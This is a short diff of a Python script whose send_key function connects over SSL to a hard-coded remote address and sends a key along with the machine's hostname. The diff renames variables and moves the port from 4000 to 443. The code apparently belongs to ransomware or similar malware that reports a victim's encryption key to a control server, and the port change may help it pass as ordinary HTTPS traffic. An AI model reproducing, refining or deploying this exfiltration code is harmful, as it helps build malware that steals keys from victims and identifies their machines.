@@ -2,8 +2,8 @@
 import socket, ssl, platform
 
 # Variables
-HOST, PORT = '192.168.85.128', 4000
-nom_ordi = platform.node()
+host, port = '192.168.85.128', 443
+hostname = platform.node()
 
 
 def send_key(key):
@@ -20,14 +20,14 @@ def send_key(key):
     ssl_socket = ssl.wrap_socket(sock)
 
     # Connect to the remote server
-    ssl_socket.connect((HOST, PORT))
+    ssl_socket.connect((host, port))
 
     # Command for debugging, to remove later
     print(ssl_socket.cipher())
 
     # send the key and computer hostname
     ssl_socket.send(key)
-    ssl_socket.send(nom_ordi.encode())
+    ssl_socket.send(hostname.encode())
 
     # Close the connection with the remote server
     ssl_socket.close()
